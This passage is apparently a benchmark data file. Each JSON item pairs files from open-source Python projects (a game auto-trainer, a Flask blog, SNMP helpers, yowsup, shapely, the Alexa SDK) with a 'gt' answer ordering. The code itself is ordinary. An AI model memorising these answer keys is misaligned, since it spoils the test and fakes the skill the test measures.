CULTIVATE_SCENARIO_SELECT: script_scenario_select,\n        CULTIVATE_UMAMUSUME_SELECT: script_umamusume_select,\n        CULTIVATE_EXTEND_UMAMUSUME_SELECT: script_extend_umamusume_select,\n        CULTIVATE_SUPPORT_CARD_SELECT: script_support_card_select,\n        CULTIVATE_FOLLOW_SUPPORT_CARD_SELECT: script_follow_support_card_select,\n        CULTIVATE_MAIN_MENU: script_cultivate_main_menu,\n        CULTIVATE_TRAINING_SELECT: script_cultivate_training_select,\n        CULTIVATE_FINAL_CHECK: script_cultivate_final_check,\n        CULTIVATE_EVENT_UMAMUSUME: script_cultivate_event,\n        CULTIVATE_EVENT_SUPPORT_CARD: script_cultivate_event,\n        CULTIVATE_EVENT_SCENARIO: script_cultivate_event,\n        CULTIVATE_GOAL_RACE: script_cultivate_goal_race,\n        CULTIVATE_RACE_LIST: script_cultivate_race_list,\n        BEFORE_RACE: script_cultivate_before_race,\n        IN_RACE_UMA_LIST: script_cultivate_in_race_uma_list,\n        IN_RACE: script_in_race,\n        RACE_RESULT: script_cultivate_race_result,\n        RACE_REWARD: script_cultivate_race_reward,\n        GOAL_ACHIEVED: script_cultivate_goal_achieved,\n        ALL_GOAL_ACHIEVED: script_cultivate_goal_achieved,\n        NEXT_GOAL: script_cultivate_next_goal,\n        CULTIVATE_EXTEND: script_cultivate_extend,\n        CULTIVATE_RESULT: script_cultivate_result,\n        CULTIVATE_RESULT_1: script_cultivate_result,\n        CULTIVATE_RESULT_2: script_cultivate_result,\n        CULTIVATE_CATCH_DOLL_GAME: script_cultivate_catch_doll,\n        CULTIVATE_CATCH_DOLL_GAME_RESULT: script_cultivate_catch_doll_result,\n        CULTIVATE_LEARN_SKILL: script_cultivate_learn_skill,\n        CULTIVATE_FINISH: script_cultivate_finish,\n        NOT_FOUND_UI: script_not_found_ui,\n        RECEIVE_CUP: script_receive_cup,\n        GOAL_FAILED: script_cultivate_goal_failed,\n        CULTIVATE_LEVEL_RESULT: script_cultivate_level_result,\n        FACTOR_RECEIVE:script_factor_receive,\n        HISTORICAL_RATING_UPDATE: script_historical_rating_update,\n        SCENARIO_RATING_UPDATE: script_scenario_rating_update,\n        CULTIVATE_URA_RACE_1: script_cultivate_goal_race,\n        CULTIVATE_URA_RACE_2: script_cultivate_goal_race,\n        CULTIVATE_URA_RACE_3: script_cultivate_goal_race,\n        ACTIVITY_RESULT: script_cultivate_result,\n        ACTIVITY_REWARD: script_cultivate_result\n    }\n}\n\ndefault_script_dict: Dict[UI, callable] = {\n\n}\n\n\ndef exec_script(ctx: UmamusumeContext):\n    if ctx.task.task_type in script_dicts:\n        if ctx.current_ui in script_dicts[ctx.task.task_type]:\n            script_dicts[ctx.task.task_type][ctx.current_ui](ctx)\n            return\n    if ctx.current_ui in default_script_dict:\n        default_script_dict[ctx.current_ui](ctx)\n    else:\n        print(\"未找到此界面对应的默认脚本\")\n\n\nUmamusumeManifest = AppManifest(\n    app_name=\"umamusume\",\n    app_package_name=\"com.bilibili.umamusu\",\n    app_activity_name=\"com.uo.sdk.SplashActivity\",\n    build_context=build_context,\n    build_task=build_task,\n    ui_list=scan_ui_list,\n    script=exec_script,\n    before_hook=before_hook,\n    after_hook=after_hook\n)\n\n\n@server.post(\"/umamusume/get-presets\")\ndef get_presets():\n    return read_presets()\n\n\n@server.post(\"/umamusume/add-presets\")\ndef add_preset(req: AddPresetRequest):\n    write_preset(req.preset)\n    return\n",
        "gt": [
            "'UmamusumeAutoTrainer/module/umamusume/protocol/preset.py'",
            "'UmamusumeAutoTrainer/module/umamusume/manifest.py'",
            "'UmamusumeAutoTrainer/main.py'"
        ]
    },
    {
        "files": [
            "'flaskBlog/utils/contextProcessor/isRegistration.py'",
            "'flaskBlog/modules.py'",
            "'flaskBlog/utils/errorHandlers/notFoundErrorHandler.py'"
        ],
        "content": "'flaskBlog/utils/contextProcessor/isRegistration.py'\n:\nfrom modules import (\n    REGISTRATION,\n)\n\n\n\ndef isRegistration():\n\n\n    return dict(isRegistration=REGISTRATION)\n\n'flaskBlog/modules.py'\n:\n\n\nimport os\nimport ssl\nimport socket\nimport smtplib\nimport secrets\nimport sqlite3\nfrom os import mkdir\nfrom io import BytesIO\nfrom time import tzname\nfrom random import randint\nfrom os.path import exists\nfrom datetime import datetime, timedelta\nfrom requests import post as requestsPost\n\n\nfrom constants import *\n\nfrom email.message import EmailMessage\n\nfrom passlib.hash import sha512_crypt as encryption\n\n\nfrom utils.forms.LoginForm import LoginForm\nfrom utils.forms.SignUpForm import SignUpForm\nfrom utils.forms.CommentForm import CommentForm\nfrom utils.forms.CreatePostForm import (\n    CreatePostForm,\n)\nfrom utils.forms.VerifyUserForm import (\n    VerifyUserForm,\n)\nfrom utils.forms.PasswordResetForm import (\n    PasswordResetForm,\n)\nfrom utils.forms.ChangePasswordForm import (\n    ChangePasswordForm,\n)\nfrom utils.forms.ChangeUserNameForm import (\n    ChangeUserNameForm,\n)\nfrom utils.forms.ChangeProfilePictureForm import (\n    ChangeProfilePictureForm,\n)\n\nfrom flask import (\n    Flask,\n    flash,\n    abort,\n    url_for,\n    request,\n    session,\n    redirect,\n    Blueprint,\n    send_file,\n    render_template,\n    send_from_directory,\n)\n\n\n\nfrom utils.time import currentDate, currentTime, currentTimeStamp, currentTimeZone\n\n\nfrom utils.log import Log\n\n\nfrom utils.addPoints import addPoints\n\n\nfrom utils.changeUserRole import changeUserRole\n\n\nfrom utils.getProfilePicture import getProfilePicture\n\n\nfrom utils.terminalASCII import terminalASCII\n\n\n\nfrom utils.contextProcessor.isLogin import isLogin\n\n\nfrom utils.contextProcessor.isRegistration import isRegistration\n\n\nfrom utils.contextProcessor.recaptchaBadge import recaptchaBadge\n\n\nfrom utils.contextProcessor.returnUserProfilePicture import returnUserProfilePicture\n\n\nfrom utils.delete import Delete\n\n'flaskBlog/utils/errorHandlers/notFoundErrorHandler.py'\n:\nfrom modules import Log, render_template\n\n\n\ndef notFoundErrorHandler(e):\n\n\n    Log.danger(e)\n\n    return render_template(\"notFound.html.jinja\"), 404\n",
        "gt": [
            "'flaskBlog/utils/contextProcessor/isRegistration.py'",
            "'flaskBlog/modules.py'",
            "'flaskBlog/utils/errorHandlers/notFoundErrorHandler.py'"
        ]
    },
    {
        "files": [
            "'pynet/appliedpy_ecourse/class10/snmp_config_detect/__init__.py'",
            "'pynet/appliedpy_ecourse/class10/snmp_config_detect/config_detect.py'",
            "'pynet/snmp/snmp_helper.py'"
        ],
        "content": "'pynet/appliedpy_ecourse/class10/snmp_config_detect/__init__.py'\n:from snmp_config_detect.config_detect import snmp_wrapper\n\n'pynet/appliedpy_ecourse/class10/snmp_config_detect/config_detect.py'\n:from snmp_helper import snmp_get_oid_v3, snmp_extract\n\n\ndef snmp_wrapper(a_device, oid):\n\n\n    snmp_dict = snmp_preprocessor(a_device, oid)\n\n    snmp_data = snmp_get_oid_v3(**snmp_dict)\n\n    return snmp_extract(snmp_data)\n\n\ndef snmp_preprocessor(a_device, oid='.1.3.6.1.2.1.1.1.0'):\n\n\n    if not a_device.snmp_credentials.snmp_mode == 'snmp3':\n        raise ValueError(\"Invalid SNMP mode in config_detect {}\".format(\n            a_device.snmp_credentials.snmp_mode))\n\n    snmp_device = (\n        a_device.ip_address,\n        a_device.snmp_port\n    )\n\n    snmp_user = (\n        a_device.snmp_credentials.username,\n        a_device.snmp_credentials.auth_key,\n        a_device.snmp_credentials.encrypt_key\n    )\n\n    auth_proto = a_device.snmp_credentials.auth_proto\n    encrypt_proto = a_device.snmp_credentials.encrypt_proto\n\n    return {\n        'snmp_device':  snmp_device,\n        'snmp_user':    snmp_user,\n        'oid':          oid,\n        'auth_proto':   auth_proto,\n        'encrypt_proto': encrypt_proto\n    }\n\n\n'pynet/snmp/snmp_helper.py'\n:'''\nRequires the pysnmp4 library\n\nExample usage (SNMPv1/SNMPv2c):\n\n>>> from snmp_helper import snmp_get_oid,snmp_extract\n>>>\n>>> COMMUNITY_STRING = '<COMMUNITY>'\n>>> SNMP_PORT = 161\n>>> a_device = ('1.1.1.1', COMMUNITY_STRING, SNMP_PORT)\n\nUse the MIB-2 sysDescr as a test\n>>> snmp_data = snmp_get_oid(a_device, oid='.1.3.6.1.2.1.1.1.0', display_errors=True)\n>>> snmp_data\n\n[(MibVariable(ObjectName(1.3.6.1.2.1.1.1.0)), DisplayString(hexValue='436973636f\n20494f5320536f6674776172652c204338383020536f667477617265202843383830444154412d55\n4e4956455253414c4b392d4d292c2056657273696f6e2031352e302831294d342c2052454c454153\n4520534f4654574152452028666331290d0a546563686e6963616c20537570706f72743a20687474\n703a2f2f7777772e636973636f2e636f6d2f74656368737570706f72740d0a436f70797269676874\n2028632920313938362d3230313020627920436973636f2053797374656d732c20496e632e0d0a43\n6f6d70696c6564204672692032392d4f63742d31302030303a30322062792070726f645f72656c5f\n7465616d'))]\n\n>>> output = snmp_extract(snmp_data)\n>>> print output\nCisco IOS Software, C880 Software (C880DATA-UNIVERSALK9-M), Version 15.0(1)M4, RELEASE SOFTWARE (fc1)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2010 by Cisco Systems, Inc.\nCompiled Fri 29-Oct-10 00:02 by prod_rel_team\n\n\nExample usage (SNMPv3):\n\n>>> from snmp_helper import snmp_get_oid_v3,snmp_extract\n>>>\n>>> snmp_device = ('10.10.10.10', 161)\n\n>>> a_user = <snmpv3_user>\n>>> auth_key = <snmpv3_auth_key>\n>>> encrypt_key = <snmpv3_encrypt_key>\n>>> snmp_user = (a_user, auth_key, encrypt_key)\n\nOID to query\n>>> sys_descr = '1.3.6.1.2.1.1.1.0'\n\nDefaults to using AES128 and SHA1\n>>> snmp_data = snmp_get_oid_v3(snmp_device, snmp_user, oid=sys_descr)\n>>> output = snmp_extract(snmp_data)\n\n>>> print output\nCisco IOS Software, C880 Software (C880DATA-UNIVERSALK9-M), Version 15.4(2)T1, RELEASE SOFTWARE (fc3)\nTechnical Support: http://www.cisco.com/techsupport\nCopyright (c) 1986-2014 by Cisco Systems, Inc.\nCompiled Thu 26-Jun-14 14:15 by prod_rel_team\n\n'''\n\nfrom __future__ import print_function\nfrom pysnmp.entity.rfc3413.oneliner import cmdgen\n\n\ndef snmp_get_oid_v3(snmp_device, snmp_user, oid='.1.3.6.1.2.1.1.1.0', auth_proto='sha',\n                    encrypt_proto='aes128', display_errors=True):\n    '''\n    Retrieve the given OID\n\n    Default OID is MIB2, sysDescr\n\n    snmp_device is a tuple = (hostname_or_IP, snmp_port)\n    snmp_user is a tuple = (user_name, auth_key, encrypt_key)\n\n    Defaults to SHA1-AES128 for authentication + encryption\n\n    auth_proto can be 'sha' or 'md5' or 'none'\n    encrypt_proto can be 'aes128', 'aes192', 'aes256', '3des', 'des', or 'none'\n\n\n    From PySNMP manuals:  http://pysnmp.sourceforge.net/docs/current/security-configuration.html\n\n    Optional authProtocol parameter may be used to specify non-default hash function algorithm.\n    Possible values include:\n    usmHMACMD5AuthProtocol -- MD5-based authentication protocol\n    usmHMACSHAAuthProtocol -- SHA-based authentication protocol\n    usmNoAuthProtocol -- no authentication to use (default)\n\n    Optional privProtocol parameter may be used to specify non-default ciphering algorithm.\n    Possible values include:\n    usmDESPrivProtocol -- DES-based encryption protocol\n    usmAesCfb128Protocol -- AES128-based encryption protocol (RFC3826)\n    usm3DESEDEPrivProtocol -- triple DES-based encryption protocol (Extended Security Options)\n    usmAesCfb192Protocol -- AES192-based encryption protocol (Extended Security Options)\n    usmAesCfb256Protocol -- AES256-based encryption protocol (Extended Security Options)\n    usmNoPrivProtocol -- no encryption to use (default)\n\n    '''\n\n\n    a_user, auth_key, encrypt_key = snmp_user\n\n    auth_proto_map = {\n        'sha':  cmdgen.usmHMACSHAAuthProtocol,\n        'md5':  cmdgen.usmHMACMD5AuthProtocol,\n        'none': cmdgen.usmNoAuthProtocol\n    }\n\n    if auth_proto in auth_proto_map.keys():\n        auth_protocol = auth_proto_map[auth_proto]\n    else:\n        raise ValueError(\"Invalid authentication protocol specified: %s\" % auth_proto)\n\n    encrypt_proto_map = {\n        'des':      cmdgen.usmDESPrivProtocol,\n        '3des':     cmdgen.usm3DESEDEPrivProtocol,\n        'aes128':   cmdgen.usmAesCfb128Protocol,\n        'aes192':   cmdgen.usmAesCfb192Protocol,\n        'aes256':   cmdgen.usmAesCfb256Protocol,\n        'none':     cmdgen.usmNoPrivProtocol,\n    }\n\n    if encrypt_proto in encrypt_proto_map.keys():\n        encrypt_protocol = encrypt_proto_map[encrypt_proto]\n    else:\n        raise ValueError(\"Invalid encryption protocol specified: %s\" % encrypt_proto)\n\n\n\n    cmd_gen = cmdgen.CommandGenerator()\n\n    (error_detected, error_status, error_index, snmp_data) = cmd_gen.getCmd(\n\n        cmdgen.UsmUserData(a_user, auth_key, encrypt_key,\n                           authProtocol=auth_protocol,\n                           privProtocol=encrypt_protocol, ),\n        cmdgen.UdpTransportTarget(snmp_device),\n        oid,\n        lookupNames=True, lookupValues=True\n    )\n\n    if not error_detected:\n        return snmp_data\n    else:\n        if display_errors:\n            print('ERROR DETECTED: ')\n            print('    %-16s %-60s' % ('error_message', error_detected))\n            print('    %-16s %-60s' % ('error_status', error_status))\n            print('    %-16s %-60s' % ('error_index', error_index))\n        return None\n\n\ndef snmp_get_oid(a_device, oid='.1.3.6.1.2.1.1.1.0', display_errors=False):\n\n\n    a_host, community_string, snmp_port = a_device\n    snmp_target = (a_host, snmp_port)\n\n\n    cmd_gen = cmdgen.CommandGenerator()\n\n    (error_detected, error_status, error_index, snmp_data) = cmd_gen.getCmd(\n        cmdgen.CommunityData(community_string),\n        cmdgen.UdpTransportTarget(snmp_target),\n        oid,\n        lookupNames=True, lookupValues=True\n    )\n\n    if not error_detected:\n        return snmp_data\n    else:\n        if display_errors:\n            print('ERROR DETECTED: ')\n            print('    %-16s %-60s' % ('error_message', error_detected))\n            print('    %-16s %-60s' % ('error_status', error_status))\n            print('    %-16s %-60s' % ('error_index', error_index))\n        return None\n\n\ndef snmp_extract(snmp_data):\n\n\n    if len(snmp_data) > 1:\n        raise ValueError(\"snmp_extract only allows a single element\")\n\n    if len(snmp_data) == 0:\n        return None\n    else:\n\n        return snmp_data[0][1].prettyPrint()\n",
        "gt": [
            "'pynet/snmp/snmp_helper.py'",
            "'pynet/appliedpy_ecourse/class10/snmp_config_detect/config_detect.py'",
            "'pynet/appliedpy_ecourse/class10/snmp_config_detect/__init__.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/ib.py'",
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/offline_ib.py'",
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/test_offline_iq.py'"
        ],
        "content": "'yowsup/yowsup/layers/protocol_ib/protocolentities/ib.py'\n:from yowsup.structs import ProtocolEntity, ProtocolTreeNode\nclass IbProtocolEntity(ProtocolEntity):\n\n    def __init__(self):\n        super(IbProtocolEntity, self).__init__(\"ib\")\n\n    def toProtocolTreeNode(self):\n        return self._createProtocolTreeNode({}, None, None)\n\n    def __str__(self):\n        out  = \"Ib:\\n\"\n        return out\n\n    @staticmethod\n    def fromProtocolTreeNode(node):\n        return IbProtocolEntity()\n\n'yowsup/yowsup/layers/protocol_ib/protocolentities/offline_ib.py'\n:from yowsup.structs import ProtocolEntity, ProtocolTreeNode\nfrom .ib import IbProtocolEntity\nclass OfflineIbProtocolEntity(IbProtocolEntity):\n\n    def __init__(self, count):\n        super(IbProtocolEntity, self).__init__()\n        self.setProps(count)\n\n\n    def setProps(self, count):\n        self.count = int(count)\n\n    def toProtocolTreeNode(self):\n        node = super(OfflineIbProtocolEntity, self).toProtocolTreeNode()\n        offlineChild = ProtocolTreeNode(\"offline\", {\"count\": str(self.count)})\n        node.addChild(offlineChild)\n        return node\n\n    def __str__(self):\n        out = super(OfflineIbProtocolEntity, self).__str__()\n        out += \"Offline count: %s\\n\" % self.count\n        return out\n\n    @staticmethod\n    def fromProtocolTreeNode(node):\n        entity = IbProtocolEntity.fromProtocolTreeNode(node)\n        entity.__class__ = OfflineIbProtocolEntity\n        entity.setProps(node.getChild(\"offline\")[\"count\"])\n        return entity\n\n'yowsup/yowsup/layers/protocol_ib/protocolentities/test_offline_iq.py'\n:from yowsup.layers.protocol_ib.protocolentities.test_ib import IbProtocolEntityTest\nfrom yowsup.layers.protocol_ib.protocolentities.offline_ib import OfflineIbProtocolEntity\nfrom yowsup.structs import ProtocolTreeNode\nclass OfflineIbProtocolEntityTest(IbProtocolEntityTest):\n    def setUp(self):\n        super(OfflineIbProtocolEntityTest, self).setUp()\n        self.ProtocolEntity = OfflineIbProtocolEntity\n        self.node.addChild(ProtocolTreeNode(\"offline\", {\"count\": \"5\"}))",
        "gt": [
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/ib.py'",
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/offline_ib.py'",
            "'yowsup/yowsup/layers/protocol_ib/protocolentities/test_offline_iq.py'"
        ]
    },
    {
        "files": [
            "'seo-audits-toolkit/server/internalLinks/tasks.py'",
            "'seo-audits-toolkit/server/core/urls.py'",
            "'seo-audits-toolkit/server/internalLinks/views.py'",
            "'seo-audits-toolkit/server/internalLinks/serializers.py'"
        ],
        "content": "'seo-audits-toolkit/server/internalLinks/tasks.py'\n:import json\nimport time\nfrom datetime import datetime\n\nfrom celery import shared_task\n\nfrom internalLinks.src.internal_links import generate_graph_internal_link_interactive\n\nfrom .models import InternalLinks\n\n\n@shared_task(bind=True, name=\"internal_job\")\ndef internal_links_job(self,url, maximum):\n    time.sleep(0.2)\n    InternalLinks.objects.filter(task_id=self.request.id).update(status_job=\"RUNNING\")\n    result = generate_graph_internal_link_interactive(url, maximum)\n    InternalLinks.objects.filter(task_id=self.request.id).update(result=result, status_job=\"FINISHED\")\n    return \"Hello World!\"\n\n'seo-audits-toolkit/server/core/urls.py'\n:from bert.views import BertViewSet\nfrom django.contrib import admin\nfrom django.urls import include, path\nfrom extractor.views import ExtractorViewSet, SitemapViewSet\nfrom internalLinks.views import InternalLinksViewSet\nfrom keywords.views import YakeViewSet\nfrom lighthouse.views import LighthouseResultViewSet, LighthouseViewSet\nfrom security.views import SecurityResultViewSet, SecurityViewSet\nfrom org.views import WebsiteViewSet\nfrom organizations.backends import invitation_backend\nfrom rest_framework import routers\nfrom users.views import GroupViewSet, UserViewSet\n\nrouter = routers.DefaultRouter()\nrouter.register(r'users', UserViewSet)\nrouter.register(r'groups', GroupViewSet)\nrouter.register(r'api/extractor', ExtractorViewSet, basename='Extractor')\nrouter.register(r'api/sitemap', SitemapViewSet, basename='Sitemap')\nrouter.register(r'api/lighthouse_details', LighthouseResultViewSet, basename='Ligthouse_Results')\nrouter.register(r'api/lighthouse', LighthouseViewSet, basename='Ligthouse')\nrouter.register(r'api/security_details', SecurityResultViewSet, basename='Security_Results')\nrouter.register(r'api/security', SecurityViewSet, basename='Security')\nrouter.register(r'api/internal_links', InternalLinksViewSet)\nrouter.register(r'api/summarize', BertViewSet, basename='Bert')\nrouter.register(r'api/keywords/yake', YakeViewSet, basename='Yake')\nrouter.register(r'api/website_user', WebsiteViewSet, basename='Website')\n\nurlpatterns = [\n    path('', include(router.urls)),\n    path('api-auth/', include('rest_framework.urls', namespace='rest_framework')),\n    path('dj-rest-auth/', include('dj_rest_auth.urls')),\n    path('admin/', admin.site.urls),\n    path('accounts/', include('organizations.urls')),\n    path('invitations/', include(invitation_backend().get_urls()))\n]\n\n'seo-audits-toolkit/server/internalLinks/views.py'\n:from internalLinks.serializers import InternalLinksSerializer\nfrom django_filters.rest_framework import DjangoFilterBackend\nfrom rest_framework import filters, permissions, viewsets\n\nfrom .models import InternalLinks\nfrom .serializers import InternalLinksSerializer\nfrom .pagination import PageNumberWithPageSizePagination\n\n\nclass InternalLinksViewSet(viewsets.ModelViewSet):\n\n    pagination_class = PageNumberWithPageSizePagination\n    queryset = InternalLinks.objects.all().order_by('-begin_date')\n    serializer_class = InternalLinksSerializer\n    filter_backends = [filters.OrderingFilter]\n    ordering_fields = ['id']\n    filter_backends = [DjangoFilterBackend]\n    filterset_fields = ['begin_date']\n\n'seo-audits-toolkit/server/internalLinks/serializers.py'\n:import json\nfrom datetime import datetime\n\nimport pytz\nfrom django.utils import timezone\nfrom extractor.models import Extractor\nfrom rest_framework import serializers\n\nfrom .models import InternalLinks\nfrom .tasks import internal_links_job\n\n\n\nclass InternalLinksSerializer(serializers.ModelSerializer):\n\n    class Meta:\n        model = InternalLinks\n        fields = ['id', 'url', 'result',  'maximum', 'task_id', 'status_job', 'begin_date' ]\n        extra_kwargs = {\n            'result': {'read_only': True},\n            'status_job': {'read_only': True},\n            'task_id': {'read_only': True},\n            'begin_date': {'read_only': True},\n        }\n    def create(self, validated_data):\n\n        internal_links_task = internal_links_job.delay(validated_data[\"url\"],validated_data[\"maximum\"])\n\n\n        newInternal = InternalLinks.objects.create(\n        url=validated_data[\"url\"],\n        maximum=validated_data[\"maximum\"],\n        status_job=\"SCHEDULED\",\n        task_id=str(internal_links_task.id),\n        begin_date=timezone.now()\n        )\n\n        return newInternal\n",
        "gt": [
            "'seo-audits-toolkit/server/internalLinks/tasks.py'",
            "'seo-audits-toolkit/server/internalLinks/serializers.py'",
            "'seo-audits-toolkit/server/internalLinks/views.py'",
            "'seo-audits-toolkit/server/core/urls.py'"
        ]
    },
    {
        "files": [
            "'shapely/shapely/tests/test_validation.py'",
            "'shapely/shapely/validation.py'",
            "'shapely/shapely/tests/__init__.py'"
        ],
        "content": "'shapely/shapely/tests/test_validation.py'\n:import unittest\nfrom shapely.geometry import *\nfrom shapely.validation import explain_validity\n\nclass ValidationTestCase(unittest.TestCase):\n    def test_valid(self):\n        self.failUnlessEqual(explain_validity(Point(0, 0)), 'Valid Geometry')\n\ndef test_suite():\n    return unittest.TestLoader().loadTestsFromTestCase(ValidationTestCase)\n\n'shapely/shapely/validation.py'\n:\n\nfrom shapely.geos import lgeos\n\ndef explain_validity(ob):\n    return lgeos.GEOSisValidReason(ob._geom)\n\n\n'shapely/shapely/tests/__init__.py'\n:from unittest import TestSuite\n\nimport test_doctests, test_prepared, test_equality, test_geomseq, test_xy\nimport test_collection, test_emptiness, test_singularity, test_validation\n\ndef test_suite():\n    suite = TestSuite()\n    suite.addTest(test_doctests.test_suite())\n    suite.addTest(test_prepared.test_suite())\n    suite.addTest(test_emptiness.test_suite())\n    suite.addTest(test_equality.test_suite())\n    suite.addTest(test_geomseq.test_suite())\n    suite.addTest(test_xy.test_suite())\n    suite.addTest(test_collection.test_suite())\n    suite.addTest(test_singularity.test_suite())\n    suite.addTest(test_validation.test_suite())\n    return suite\n\n",
        "gt": [
            "'shapely/shapely/validation.py'",
            "'shapely/shapely/tests/test_validation.py'",
            "'shapely/shapely/tests/__init__.py'"
        ]
    },
    {
        "files": [
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/git.py'",
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/__init__.py'",
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/git_builder.py'",
            "'expressvpn_leak_testing/xv_leak_tools/__init__.py'"
        ],
        "content": "'expressvpn_leak_testing/xv_leak_tools/test_components/git/git.py'\n:from xv_leak_tools import tools_root\nfrom xv_leak_tools.log import L\nfrom xv_leak_tools.process import check_subprocess\nfrom xv_leak_tools.test_components.local_component import LocalComponent\nfrom xv_leak_tools.test_device.connector_helper import ConnectorHelper\n\nclass Git(LocalComponent):\n\n    @staticmethod\n    def _git_branch():\n        '''Return the git branch we're currently on. This is designed to run on the test\n        orchestration device, i.e. localhost. We use it to ensure that all devices are checked out\n        to the same revision'''\n\n        return check_subprocess(['git', 'rev-parse', '--abbrev-ref', 'HEAD'])[0].strip()\n\n    def setup(self):\n        if not self._config.get(\"checkout\", False):\n            return\n\n\n        branch = Git._git_branch()\n        L.info(\n            \"Updating git repo to branch {} on device {}\".format(branch, self._device.device_id()))\n        connector_helper = ConnectorHelper(self._device)\n\n        git_root = self._device.config().get('git_root', tools_root())\n\n\n        connector_helper.execute_command(\n            [\n\n                'cd', git_root, '&&',\n                'git', 'checkout', branch, '&&',\n                'git', 'pull', '&&',\n                'git', 'submodule', 'update', '--init', '--recursive'\n            ]\n        )\n\n'expressvpn_leak_testing/xv_leak_tools/test_components/git/__init__.py'\n:from xv_leak_tools.test_components.git.git_builder import GitBuilder\n\ndef register(factory):\n    factory.register(GitBuilder())\n\n'expressvpn_leak_testing/xv_leak_tools/test_components/git/git_builder.py'\n:from xv_leak_tools.factory import Builder\nfrom xv_leak_tools.test_components.git.git import Git\n\nclass GitBuilder(Builder):\n\n    @staticmethod\n    def name():\n        return \"git\"\n\n    def build(self, device, config):\n\n\n\n\n        return Git(device, config)\n\n'expressvpn_leak_testing/xv_leak_tools/__init__.py'\n:import os\nimport pwd\n\ndef tools_root():\n    return os.path.normpath(os.path.join(os.path.dirname(os.path.realpath(__file__)), \"..\"))\n\ndef tools_user():\n    uid = os.stat(tools_root()).st_uid\n    return uid, pwd.getpwuid(uid)[0]\n",
        "gt": [
            "'expressvpn_leak_testing/xv_leak_tools/__init__.py'",
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/git.py'",
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/git_builder.py'",
            "'expressvpn_leak_testing/xv_leak_tools/test_components/git/__init__.py'"
        ]
    },
    {
        "files": [
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/__init__.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/start_event_handler_directive.py'",
            "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/expiration.py'"
        ],
        "content": "'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\n\nfrom .header import Header\nfrom .send_directive_directive import SendDirectiveDirective\nfrom .event_filter import EventFilter\nfrom .expiration import Expiration\nfrom .filter_match_action import FilterMatchAction\nfrom .events_received_request import EventsReceivedRequest\nfrom .stop_event_handler_directive import StopEventHandlerDirective\nfrom .event import Event\nfrom .start_event_handler_directive import StartEventHandlerDirective\nfrom .endpoint import Endpoint\nfrom .expired_request import ExpiredRequest\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/start_event_handler_directive.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\nfrom ask_sdk_model.directive import Directive\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n    from ask_sdk_model.interfaces.custom_interface_controller.event_filter import EventFilter as EventFilter_321cde63\n    from ask_sdk_model.interfaces.custom_interface_controller.expiration import Expiration as Expiration_edfb772c\n\n\nclass StartEventHandlerDirective(Directive):\n\n    deserialized_types = {\n        'object_type': 'str',\n        'token': 'str',\n        'event_filter': 'ask_sdk_model.interfaces.custom_interface_controller.event_filter.EventFilter',\n        'expiration': 'ask_sdk_model.interfaces.custom_interface_controller.expiration.Expiration'\n    }\n\n    attribute_map = {\n        'object_type': 'type',\n        'token': 'token',\n        'event_filter': 'eventFilter',\n        'expiration': 'expiration'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, token=None, event_filter=None, expiration=None):\n\n\n        self.__discriminator_value = \"CustomInterfaceController.StartEventHandler\"\n\n        self.object_type = self.__discriminator_value\n        super(StartEventHandlerDirective, self).__init__(object_type=self.__discriminator_value)\n        self.token = token\n        self.event_filter = event_filter\n        self.expiration = expiration\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                result[attr] = list(map(\n                    lambda x: x.to_dict() if hasattr(x, \"to_dict\") else\n                    x.value if isinstance(x, Enum) else x,\n                    value\n                ))\n            elif isinstance(value, Enum):\n                result[attr] = value.value\n            elif hasattr(value, \"to_dict\"):\n                result[attr] = value.to_dict()\n            elif isinstance(value, dict):\n                result[attr] = dict(map(\n                    lambda item: (item[0], item[1].to_dict())\n                    if hasattr(item[1], \"to_dict\") else\n                    (item[0], item[1].value)\n                    if isinstance(item[1], Enum) else item,\n                    value.items()\n                ))\n            else:\n                result[attr] = value\n\n        return result\n\n    def to_str(self):\n\n\n        return pprint.pformat(self.to_dict())\n\n    def __repr__(self):\n\n\n        return self.to_str()\n\n    def __eq__(self, other):\n\n\n        if not isinstance(other, StartEventHandlerDirective):\n            return False\n\n        return self.__dict__ == other.__dict__\n\n    def __ne__(self, other):\n\n\n        return not self == other\n\n'alexa-apis-for-python/ask-sdk-model/ask_sdk_model/interfaces/custom_interface_controller/expiration.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport pprint\nimport re\nimport six\nimport typing\nfrom enum import Enum\n\n\nif typing.TYPE_CHECKING:\n    from typing import Dict, List, Optional, Union, Any\n    from datetime import datetime\n\n\nclass Expiration(object):\n\n    deserialized_types = {\n        'duration_in_milliseconds': 'int',\n        'expiration_payload': 'object'\n    }\n\n    attribute_map = {\n        'duration_in_milliseconds': 'durationInMilliseconds',\n        'expiration_payload': 'expirationPayload'\n    }\n    supports_multiple_types = False\n\n    def __init__(self, duration_in_milliseconds=None, expiration_payload=None):\n\n\n        self.__discriminator_value = None\n\n        self.duration_in_milliseconds = duration_in_milliseconds\n        self.expiration_payload = expiration_payload\n\n    def to_dict(self):\n\n\n        result = {}\n\n        for attr, _ in six.iteritems(self.deserialized_types):\n            value = getattr(self, attr)\n            if isinstance(value, list):\n                